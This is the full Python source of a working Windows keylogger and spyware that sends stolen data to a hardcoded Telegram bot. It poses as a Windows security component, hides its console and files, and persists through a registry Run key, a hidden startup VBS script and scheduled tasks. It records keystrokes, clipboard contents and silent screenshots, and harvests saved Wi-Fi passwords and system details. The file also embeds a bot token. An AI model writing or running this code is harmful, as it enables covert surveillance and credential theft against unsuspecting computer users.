import os
import sys
import shutil
import threading
import time
import platform
import socket
import uuid
import re
import winreg
import ctypes
import ctypes.wintypes
import subprocess
import io
from datetime import datetime

try:
    from pynput import keyboard
    import requests
    import psutil
    from PIL import ImageGrab
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput", "requests", "psutil", "pillow", "--quiet"])
    from pynput import keyboard
    import requests
    import psutil
    from PIL import ImageGrab

# ─── CONFIG ───
BOT_TOKEN = '7808413899:AAFUPT6mZ4oWus3pM3YUWUTVnhD58WWMOEw'
CHAT_ID = '5138427828'
INTERVAL = 45
FILENAME = "WindowsSecurityHealth.exe"
APPDATA_DIR = os.path.join(os.getenv("APPDATA"), "Microsoft", "SystemHealth")
HIDDEN_PATH = os.path.join(APPDATA_DIR, FILENAME)
LOG_FILE = os.path.join(APPDATA_DIR, "cache.tmp")

# ─── HIDE CONSOLE IMMEDIATELY ───
def hide_console():
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except:
        pass

hide_console()

# ─── TELEGRAM ───
def send_telegram(text, parse_mode="HTML"):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    chunks = [text[i:i+4000] for i in range(0, len(text), 4000)]
    for chunk in chunks:
        try:
            requests.post(url, data={'chat_id': CHAT_ID, 'text': chunk, 'parse_mode': parse_mode}, timeout=10)
        except:
            pass

def send_photo_memory(buffer):
    """Send screenshot directly from RAM, zero disk touch"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        requests.post(url, data={'chat_id': CHAT_ID},
                     files={'photo': (f'{timestamp}.jpg', buffer, 'image/jpeg')}, timeout=15)
    except:
        pass

def send_document(path, caption=""):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        with open(path, 'rb') as f:
            requests.post(url, data={'chat_id': CHAT_ID, 'caption': caption}, files={'document': f}, timeout=15)
    except:
        pass

# ─── SILENT SCREENSHOT (RAM ONLY) ───
def take_screenshot_silent():
    """
    Captures screen entirely in memory.
    No file saved to disk. No sound. No visual indicator.
    Compressed JPEG sent directly to Telegram from RAM buffer.
    """
    try:
        img = ImageGrab.grab()
        buffer = io.BytesIO()
        img.save(buffer, format='JPEG', quality=45)
        buffer.seek(0)
        send_photo_memory(buffer)
        buffer.close()
        del img
    except:
        pass

# ─── IDLE TIME CHECK ───
def get_idle_seconds():
    """Returns how many seconds user has been idle"""
    class LASTINPUTINFO(ctypes.Structure):
        _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
    lii = LASTINPUTINFO()
    lii.cbSize = ctypes.sizeof(lii)
    ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
    millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
    return millis / 1000.0

# ─── SYSTEM RECON ───
def get_public_ip():
    try:
        return requests.get("https://api.ipify.org?format=json", timeout=5).json()["ip"]
    except:
        return "Unknown"

def get_wifi_passwords():
    results = ""
    try:
        output = subprocess.check_output("netsh wlan show profiles", shell=True,
                                        stderr=subprocess.DEVNULL, creationflags=0x08000000).decode()
        profiles = re.findall(r"All User Profile\s*:\s*(.*)", output)
        for profile in profiles:
            profile = profile.strip()
            try:
                pwd_output = subprocess.check_output(
                    f'netsh wlan show profile name="{profile}" key=clear',
                    shell=True, stderr=subprocess.DEVNULL, creationflags=0x08000000
                ).decode()
                pwd = re.findall(r"Key Content\s*:\s*(.*)", pwd_output)
                results += f"  {profile}: {pwd[0].strip() if pwd else 'N/A'}\n"
            except:
                pass
    except:
        pass
    return results

def get_installed_software():
    apps = []
    paths = [
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
        (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
    ]
    for hive, path in paths:
        try:
            with winreg.OpenKey(hive, path) as key:
                for i in range(winreg.QueryInfoKey(key)[0]):
                    try:
                        subkey_name = winreg.EnumKey(key, i)
                        with winreg.OpenKey(key, subkey_name) as subkey:
                            name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                            if name not in apps:
                                apps.append(name)
                    except:
                        pass
        except:
            pass
    return sorted(apps)[:60]

def get_running_processes():
    procs = []
    for p in psutil.process_iter(['name', 'pid', 'memory_info']):
        try:
            mem = round(p.info['memory_info'].rss / (1024*1024), 1)
            procs.append(f"{p.info['name']} (PID:{p.info['pid']}) {mem}MB")
        except:
            pass
    return sorted(procs)[:50]

def get_startup_programs():
    startups = []
    keys = [
        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
        (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
    ]
    for hive, path in keys:
        try:
            key = winreg.OpenKey(hive, path)
            i = 0
            while True:
                try:
                    name, value, _ = winreg.EnumValue(key, i)
                    startups.append(f"{name}: {value}")
                    i += 1
                except OSError:
                    break
            winreg.CloseKey(key)
        except:
            pass
    return startups

def get_antivirus():
    try:
        output = subprocess.check_output(
            'wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName /format:list',
            shell=True, stderr=subprocess.DEVNULL, creationflags=0x08000000
        ).decode()
        avs = re.findall(r"displayName=(.*)", output)
        return [a.strip() for a in avs if a.strip()]
    except:
        return ["Unknown"]

def get_battery_info():
    try:
        battery = psutil.sensors_battery()
        if battery:
            return f"{battery.percent}% | {'Plugged in' if battery.power_plugged else 'On battery'}"
    except:
        pass
    return "Desktop / No battery"

def system_report():
    pub_ip = get_public_ip()
    uname = platform.uname()
    boot_time = datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
    ram = psutil.virtual_memory()
    cpu_freq = psutil.cpu_freq()

    disks = []
    for part in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(part.mountpoint)
            disks.append(f"  {part.device} [{part.fstype}] → {round(usage.used/1e9,1)}/{round(usage.total/1e9,1)} GB ({usage.percent}%)")
        except:
            pass

    net_info = []
    for iface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == socket.AF_INET and not addr.address.startswith("127."):
                net_info.append(f"  {iface}: {addr.address}")

    report = f"""<b>══════ 🎯 NEW TARGET ACQUIRED ══════</b>

<b>⏰ Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
<b>💻 PC Name:</b> {uname.node}
<b>👤 Username:</b> {os.getlogin()}
<b>🌐 Public IP:</b> {pub_ip}
<b>🏠 Local IPs:</b>
{chr(10).join(net_info)}
<b>🔑 MAC:</b> {':'.join(re.findall('..', '%012x' % uuid.getnode()))}

<b>═══ ⚙️ SYSTEM ═══</b>
<b>OS:</b> {uname.system} {uname.release} (Build {uname.version})
<b>Arch:</b> {uname.machine}
<b>Processor:</b> {uname.processor}
<b>CPU:</b> {psutil.cpu_count(logical=False)}C/{psutil.cpu_count()}T @ {round(cpu_freq.max) if cpu_freq else '?'}MHz
<b>RAM:</b> {round(ram.total/1e9,2)} GB (Used: {ram.percent}%)
<b>🔋 Battery:</b> {get_battery_info()}
<b>🛡️ Antivirus:</b> {', '.join(get_antivirus())}
<b>⏱️ Boot:</b> {boot_time}

<b>═══ 💾 STORAGE ═══</b>
{chr(10).join(disks)}

<b>═══ 📶 WIFI PASSWORDS ═══</b>
{get_wifi_passwords() or 'None found'}

<b>═══ 🚀 STARTUP PROGRAMS ═══</b>
{chr(10).join(get_startup_programs()) or 'None'}
"""
    send_telegram(report)

    apps = get_installed_software()
    if apps:
        send_telegram("<b>═══ 📦 INSTALLED SOFTWARE ═══</b>\n" + "\n".join(f"• {a}" for a in apps))

    procs = get_running_processes()
    if procs:
        send_telegram("<b>═══ 🔄 RUNNING PROCESSES ═══</b>\n<pre>" + "\n".join(procs) + "</pre>")

# ─── SMART KEYLOGGER ───
class SmartKeylogger:
    def __init__(self):
        self.log = ""
        self.current_window = ""
        self.word_buffer = ""

    def get_active_window(self):
        try:
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
            buf = ctypes.create_unicode_buffer(length + 1)
            ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
            return buf.value if buf.value else "Unknown"
        except:
            return "Unknown"

    def on_press(self, key):
        window = self.get_active_window()

        if window != self.current_window:
            self.current_window = window
            ts = datetime.now().strftime("%H:%M:%S")
            self.log += f"\n\n━━ [{ts}] 🪟 {window} ━━\n"

        try:
            self.log += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.log += " "
            elif key == keyboard.Key.enter:
                self.log += "\n"
            elif key == keyboard.Key.tab:
                self.log += "    "
            elif key == keyboard.Key.backspace:
                if self.log and self.log[-1] not in ('\n', '━'):
                    self.log = self.log[:-1]
            elif key in (keyboard.Key.shift, keyboard.Key.shift_r,
                        keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
                        keyboard.Key.alt_l, keyboard.Key.alt_r,
                        keyboard.Key.alt_gr, keyboard.Key.cmd,
                        keyboard.Key.caps_lock, keyboard.Key.num_lock,
                        keyboard.Key.scroll_lock):
                pass  # skip garbage modifiers
            elif key == keyboard.Key.esc:
                self.log += " [ESC] "
            elif key in (keyboard.Key.up, keyboard.Key.down, keyboard.Key.left, keyboard.Key.right):
                pass  # skip arrows
            elif key in (keyboard.Key.delete, keyboard.Key.end, keyboard.Key.home,
                        keyboard.Key.page_up, keyboard.Key.page_down, keyboard.Key.insert):
                pass  # skip nav keys
            else:
                self.log += f"[{str(key).replace('Key.', '')}]"

    def get_and_clear(self):
        if not self.log.strip():
            return None
        output = self.log
        self.log = ""
        return output

# ─── CLIPBOARD ───
def get_clipboard():
    try:
        CF_UNICODETEXT = 13
        ctypes.windll.user32.OpenClipboard(0)
        try:
            if ctypes.windll.user32.IsClipboardFormatAvailable(CF_UNICODETEXT):
                handle = ctypes.windll.user32.GetClipboardData(CF_UNICODETEXT)
                if handle:
                    return ctypes.c_wchar_p(handle).value
        finally:
            ctypes.windll.user32.CloseClipboard()
    except:
        pass
    return None

# ─── PERSISTENCE (TRIPLE METHOD) ───
def install_persistence():
    os.makedirs(APPDATA_DIR, exist_ok=True)

    if not os.path.exists(HIDDEN_PATH):
        try:
            shutil.copy2(sys.executable, HIDDEN_PATH)
            ctypes.windll.kernel32.SetFileAttributesW(HIDDEN_PATH, 0x02 | 0x04)
        except:
            pass

    # Hide the folder too
    try:
        ctypes.windll.kernel32.SetFileAttributesW(APPDATA_DIR, 0x02 | 0x04)
    except:
        pass

    # 1. Registry
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsSecurityHealth", 0, winreg.REG_SZ, HIDDEN_PATH)
        winreg.CloseKey(key)
    except:
        pass

    # 2. Startup folder
    try:
        startup = os.path.join(os.getenv("APPDATA"),
                               "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        vbs_path = os.path.join(startup, "syshealth.vbs")
        if not os.path.exists(vbs_path):
            with open(vbs_path, 'w') as f:
                f.write(f'Set WshShell = CreateObject("WScript.Shell")\n')
                f.write(f'WshShell.Run """{HIDDEN_PATH}""", 0, False\n')
            ctypes.windll.kernel32.SetFileAttributesW(vbs_path, 0x02)
    except:
        pass

    # 3. Scheduled Task (runs at logon + every 5 min if killed)
    try:
        subprocess.run(
            f'schtasks /create /tn "MicrosoftSecurityHealthService" '
            f'/tr "{HIDDEN_PATH}" /sc onlogon /rl highest /f',
            shell=True, capture_output=True, creationflags=0x08000000
        )
        subprocess.run(
            f'schtasks /create /tn "MicrosoftSecurityHealthCheck" '
            f'/tr "{HIDDEN_PATH}" /sc minute /mo 5 /f',
            shell=True, capture_output=True, creationflags=0x08000000
        )
    except:
        pass

# ─── REPORT LOOP ───
last_clipboard = ""

def report_cycle(keylogger):
    global last_clipboard

    # Send keystrokes
    log_data = keylogger.get_and_clear()
    if log_data:
        header = f"<b>⌨️ Keys | {datetime.now().strftime('%H:%M %d/%m')}</b>"
        send_telegram(header + f"\n<pre>{log_data[:3800]}</pre>")
        # Backup locally
        try:
            with open(LOG_FILE, 'a', encoding='utf-8') as f:
                f.write(log_data)
        except:
            pass

    # Clipboard check
    clip = get_clipboard()
    if clip and clip.strip() and clip != last_clipboard and len(clip.strip()) > 2:
        last_clipboard = clip
        send_telegram(f"<b>📋 Clipboard:</b>\n<pre>{clip[:3000]}</pre>")

    # Silent screenshot only when user active
    if not hasattr(report_cycle, 'count'):
        report_cycle.count = 0
    report_cycle.count += 1

    if report_cycle.count % 4 == 0:  # every ~3 minutes
        idle = get_idle_seconds()
        if idle < 60:  # only if user active in last minute
            take_screenshot_silent()

    # Repeat
    timer = threading.Timer(INTERVAL, report_cycle, args=[keylogger])
    timer.daemon = True
    timer.start()

# ─── WATCHDOG (restart if listener dies) ───
def watchdog(keylogger):
    while True:
        time.sleep(300)
        # Send heartbeat
        try:
            send_telegram(f"<b>💓 Alive | CPU: {psutil.cpu_percent()}% | RAM: {psutil.virtual_memory().percent}%</b>")
        except:
            pass

# ─── MAIN ───
def main():
    install_persistence()

    # First run recon
    marker = os.path.join(APPDATA_DIR, ".init")
    if not os.path.exists(marker):
        send_telegram("<b>🟢 TARGET ONLINE — First Execution</b>")
        system_report()
        time.sleep(2)
        take_screenshot_silent()
        with open(marker, 'w') as f:
            f.write(str(time.time()))
    else:
        send_telegram(f"<b>🔄 System restarted | {datetime.now().strftime('%Y-%m-%d %H:%M')}</b>\n<b>👤</b> {os.getlogin()}")
        take_screenshot_silent()

    # Start keylogger
    kl = SmartKeylogger()
    report_cycle(kl)

    # Watchdog thread
    wd = threading.Thread(target=watchdog, args=[kl], daemon=True)
    wd.start()

    # Listener (blocks)
    with keyboard.Listener(on_press=kl.on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()